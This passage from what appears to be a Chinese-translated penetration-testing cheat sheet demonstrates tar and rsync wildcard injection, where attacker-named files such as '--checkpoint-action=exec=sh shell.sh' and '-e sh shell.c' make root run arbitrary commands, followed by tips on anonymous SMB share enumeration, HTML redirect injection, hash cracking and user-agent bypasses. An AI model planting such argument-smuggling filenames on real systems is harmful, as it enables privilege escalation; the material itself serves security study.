<p>现在，例如，root用户想要创建当前目录中所有文件的归档。</p>
<pre><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># tar cf archive.tar *</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span></pre>
<p>Boom!！发生了什么？/ usr / bin / id命令被执行！我们只是在root权限下实现了任意命令执行。再次，用户&#8217;leon&#8217;有几个文件创建。</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">19</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">=</span><span class="mi">1</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">17</span> <span class="o">--</span><span class="n">checkpoint</span><span class="o">-</span><span class="n">action</span><span class="o">=</span><span class="n">exec</span><span class="o">=</span><span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">12</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">17</span> <span class="n">shell</span><span class="o">.</span><span class="n">sh</span></pre>
</div>
</div>
<p>选项&#8217;-checkpoint = 1&#8217;和&#8217;-checkpoint-action = exec = sh shell.sh&#8217;作为命令行选项传递给&#8217;tar&#8217;程序。基本上，他们命令tar执行shell.sh shell脚本。</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># cat shell.sh</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="nb">id</span></pre>
</div>
</div>
<p>所以，有了这个tar参数污染，我们基本上可以执行任意命令与运行tar的用户的特权。如上面的“root”帐户所示。</p>
</div>
<ul class="simple">
<li><strong>Rsync任意命令执行</strong></li>
</ul>
<div>
<p>Rsync是一个“快速，通用，远程（和本地）文件复制工具”，这是非常常见的Unix系统工具。如果我们检查&#8217;rsync&#8217;手册页，我们可以再次找到可以滥用于任意命令执行的选项。</p>
<p>Rsync manual：“你可以使用rcp相同的方式使用rsync。但你必须指定源和目标，其中一个可能是远程的。</p>
<p>手动有趣的rsync选项：</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="o">-</span><span class="n">e</span><span class="p">,</span> <span class="o">--</span><span class="n">rsh</span><span class="o">=</span><span class="n">COMMAND</span>       <span class="n">specify</span> <span class="n">the</span> <span class="n">remote</span> <span class="n">shell</span> <span class="n">to</span> <span class="n">use</span>
<span class="o">--</span><span class="n">rsync</span><span class="o">-</span><span class="n">path</span><span class="o">=</span><span class="n">PROGRAM</span>    <span class="n">specify</span> <span class="n">the</span> <span class="n">rsync</span> <span class="n">to</span> <span class="n">run</span> <span class="n">on</span> <span class="n">remote</span> <span class="n">machine</span></pre>
</div>
</div>
<p>让我们直接使用&#8217;rsync&#8217;手册页中一个弊端例子。以下示例将把本地目录中的所有C文件复制到&#8217;/ src&#8217;目录中的远程主机“foo”。</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="c1"># rsync -t *.c foo:src/</span></pre>
</div>
</div>
<p>目录内容：</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">72</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">47</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="o">-</span><span class="n">e</span> <span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">31</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span></pre>
</div>
</div>
<p>现在root将尝试将所有C文件复制到远程服务器。</p>
<pre><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># rsync -t *.c foo:src/</span>

<span class="n">rsync</span><span class="p">:</span> <span class="n">connection</span> <span class="n">unexpectedly</span> <span class="n">closed</span> <span class="p">(</span><span class="mi">0</span> <span class="nb">bytes</span> <span class="n">received</span> <span class="n">so</span> <span class="n">far</span><span class="p">)</span> <span class="p">[</span><span class="n">sender</span><span class="p">]</span>
<span class="n">rsync</span> <span class="n">error</span><span class="p">:</span> <span class="n">error</span> <span class="ow">in</span> <span class="n">rsync</span> <span class="n">protocol</span> <span class="n">data</span> <span class="n">stream</span> <span class="p">(</span><span class="n">code</span> <span class="mi">12</span><span class="p">)</span> <span class="n">at</span> <span class="n">io</span><span class="o">.</span><span class="n">c</span><span class="p">(</span><span class="mi">601</span><span class="p">)</span> <span class="p">[</span><span class="n">sender</span><span class="o">=</span><span class="mf">3.0</span><span class="o">.</span><span class="mi">8</span><span class="p">]</span></pre>
<p>让我们看看发生了什么&#8230;</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
<span class="n">total</span> <span class="mi">76</span>
<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">49</span> <span class="o">.</span>
<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="o">-</span><span class="n">e</span> <span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">31</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">101</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">49</span> <span class="n">shell_output</span><span class="o">.</span><span class="n">txt</span></pre>
</div>
</div>
<p>有两个文件是用户&#8217;leon&#8217;拥有，如下所列。</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="o">-</span><span class="n">e</span> <span class="n">sh</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">31</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">45</span> <span class="n">shell</span><span class="o">.</span><span class="n">c</span></pre>
</div>
</div>
<p>执行&#8217;rsync&#8217;后，所有者为root的新文件shell_output.txt在同一目录中创建。</p>
<div class="highlight-default">
<div class="highlight">
<pre><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">101</span> <span class="n">Mar</span> <span class="mi">28</span> <span class="mi">04</span><span class="p">:</span><span class="mi">49</span> <span class="n">shell_output</span><span class="o">.</span><span class="n">txt</span></pre>
</div>
</div>
<p>如果我们检查其内容，则会找到以下数据。</p>
<pre><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># cat shell_output.txt</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">context</span><span class="o">=</span><span class="n">unconfined_u</span><span class="p">:</span><span class="n">unconfined_r</span><span class="p">:</span><span class="n">unconfined_t</span><span class="p">:</span><span class="n">s0</span><span class="o">-</span><span class="n">s0</span><span class="p">:</span><span class="n">c0</span><span class="o">.</span><span class="n">c1023</span></pre>
<div class="highlight-default">Trick是因为&#8217;* .c&#8217;通配符，&#8217;rsync&#8217;在命令行中有&#8217;-e sh shell.c&#8217;选项，而shell.c将在&#8217;syync&#8217;启动时执行。 shell.c的内容如下所示。</div>
<div class="highlight-default">
<pre><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># cat shell.c</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="nb">id</span> <span class="o">&gt;</span> <span class="n">shell_output</span><span class="o">.</span><span class="n">txt</span></pre>
</div>
</div>
</div>
</div>
<div id="tips-and-tricks" class="section">
<h2>提示和技巧</h2>
<ul class="simple">
<li>运行部件</li>
</ul>
<div>
<p>在目录中找到，并运行名为run-parts 的所有可执行文件。当我们等待cron作业运行时，这是非常有用的。它可以用于执行文件夹中存在的脚本。</p>
</div>
<div>
<div class="highlight-default">
<div class="highlight">
<pre><span class="n">run</span><span class="o">-</span><span class="n">parts</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">cron</span><span class="o">.</span><span class="n">daily</span></pre>
</div>
</div>
</div>
<ul class="simple">
<li>Sudoers文件：</li>
</ul>
<div>
<p>如果sudoers文件包含：</p>
</div>
<pre>secure\_path
Path used for every command run from sudo. If you don't trust the people running sudo to have a 
sane PATH environment         variable you may want to use this. Another use is if you want to have 
the “root path” be separate from the “user path”. Users in the group specified by the exempt\_group 
option are not affected by secure\_path. This option is not set by default.

env\_reset If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME,
MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO\_\* variables. Any variables in the caller's environment 
that match the env\_keep and env\_check lists are then added, followed by any variables present in the 
file specified by the env\_file option (if any). The contents of the env\_keep and env\_check lists, as 
modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V 
option. If the secure\_path option is set, its value will be used for the PATH environment variable. This 
flag is on by default.

mail\_badpass Send mail to the mailto user if the user running sudo does not enter the correct password. 
If the command the user is attempting to run is not permitted by sudoers and one of 
the mail\_all\_cmnds, mail\_always, mail\_no\_host, mail\_no\_perms or mail\_no\_user flags are set, 
this flag will have no effect. This flag is off by default.
</pre>
<ul>
<li>
<p class="first">XSS / HTML注入：</p>
<p>以下内容会将网页重新导向至google.com</li>
</ul>
<div>
<div class="highlight-default">
<div class="highlight">
<pre>&lt;META http-equiv=“refresh” content=“0;URL=http://www.google.com”&gt;</pre>
</div>
</div>
</div>
<ul class="simple">
<li>重要的是检查.profile文件。因为它可能包含用户登录时执行的脚本。此外，重要的是看到应用程序如何存储密码。</li>
<li>如果OPcache引擎好像是启用了（从phpinfo.php文件检查），这可能允许绕过某些不允许在Web目录中进行文件写入访问的加固技术（<a href="http://gosecure.net/2016/04/27/binary-webshell-through-opcache-in-php-7/">见文章</a>）</li>
<li>操作系统的标识：</li>
</ul>
<div>
<div class="highlight-default">
<div class="highlight">
<pre><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">os</span><span class="o">-</span><span class="n">release</span>

<span class="n">NAME</span><span class="o">=</span><span class="s2">"Ubuntu"</span> <span class="n">VERSION</span><span class="o">=</span><span class="s2">"16.04 LTS (Xenial Xerus)"</span> <span class="n">ID</span><span class="o">=</span><span class="n">ubuntu</span>
<span class="n">ID</span>\<span class="n">_LIKE</span><span class="o">=</span><span class="n">debian</span> <span class="n">PRETTY</span>\<span class="n">_NAME</span><span class="o">=</span><span class="s2">"Ubuntu 16.04 LTS"</span> <span class="n">VERSION</span>\<span class="n">_ID</span><span class="o">=</span><span class="s2">"16.04"</span>
<span class="n">HOME</span>\<span class="n">_URL</span><span class="o">=</span><span class="s2">"http://www.ubuntu.com/"</span>
<span class="n">SUPPORT</span>\<span class="n">_URL</span><span class="o">=</span><span class="s2">"http://help.ubuntu.com/"</span>
<span class="n">BUG</span>\<span class="n">_REPORT</span>\<span class="n">_URL</span><span class="o">=</span><span class="s2">"http://bugs.launchpad.net/ubuntu/"</span>
<span class="n">UBUNTU</span>\<span class="n">_CODENAME</span><span class="o">=</span><span class="n">xenial</span></pre>
</div>
</div>
</div>
<ul class="simple">
<li>
<dl class="first docutils">
<dt>Java密钥库文件：</dt>
<dd>&lt;<a class="reference external" href="https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores">https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores</a>&gt;</dd>
<dd>和</dd>
<dd>&lt;<a href="https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats">https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats</a>&gt;</dd>
</dl>
</li>
<li>
<dl class="first docutils">
<dt>破解MD5哈希：</dt>
<dd>尝试&lt; <a class="reference external" href="https://crackstation.net/">https://crackstation.net/</a> &gt;</dd>
</dl>
</li>
<li>通过wheel/adm用户查找文件。</li>
</ul>
<div>默认情况下cewl生成一个单词的单词列表。它默认忽略单引号。例如：如果“Policy of Truth”用引号写，它会把它当作三个字。然而，我们想要的是考虑整句话之间的引号。通过在cewl源代码中做一个小的改变，我们可以引号所有的单词，我们也可以删除空格和从上到下改变，我们也能够创建一个小的词表。</div>
<div></div>
<ul class="simple">
<li>当你看到这样的“Nick&#8217;s sup3r s3cr3t dr0pb0x &#8211; only me and Steve Jobs can see this content”。这说明我只有这可以看到。尝试看看它在谈论什么用户代理。它的实现方式是使用.htaccess文件</li>
</ul>
<div>
<div class="highlight-default">
<div class="highlight">
<pre>cat .htaccess
BrowserMatchNoCase "iPhone" allowed

Order Deny,Allow
Deny from ALL
Allow from env=allowed
ErrorDocument 403
 “&lt;H1&gt;Nick’s sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content&lt;/H1&gt;&lt;H2&gt;Lol&lt;/H2&gt;”</pre>
</div>
</div>
</div>
<ul class="simple">
<li>端口139打开</li>
</ul>
<pre>smbclient -N -L 192.168.1.2 WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
kathy           Disk      Fred, What are we doing here?
tmp             Disk      All temporary files should be stored here
IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

Server               Comment
---------            -------
RED                  red server (Samba, Ubuntu)

Workgroup            Master
---------            -------
WORKGROUP            RED

-N : If specified, this parameter suppresses the normal password promptfrom the client to the user. 
This is useful when accessing a service that does not require a password. -L\|--list This option 
allows you to look at what services are available on a server. You use it as smbclient
-L host and a list should appear. The -I option may be useful if your NetBIOS names don't 
match your TCP/IP DNS host names or if you aretrying to reach a host on another network.</pre>
<div>
<p>如果要访问你可能想要键入的共享</p>
</div>
<div>
<div class="highlight-default">
<div class="highlight">
<pre><span class="n">smbclient</span> \\\\<span class="n">IP</span>\\<span class="n">share</span>\<span class="n">_name</span></pre>
</div>
</div>
</div>
<div>
<p>所以，在上面的例子中，它应该</p>
</div>
<div>
<div class="highlight-default">
<div class="highlight">
<pre><span class="n">smbclient</span> \\\\<span class="mf">192.168</span><span class="o">.</span><span class="mf">1.2</span>\\<span class="n">kathy</span></pre>
</div>
</div>
</div>
<div>
<p>如果端口139是打开的，也运行enum4linux，可能会帮助获取用户列表</p>
</div>
<ul>
<li>
<p class="first">curl</p>
</li>
</ul>
<pre>-k, --insecure
(SSL) This option explicitly allows curl to perform "insecure" SSL connections and transfers. All SSL 
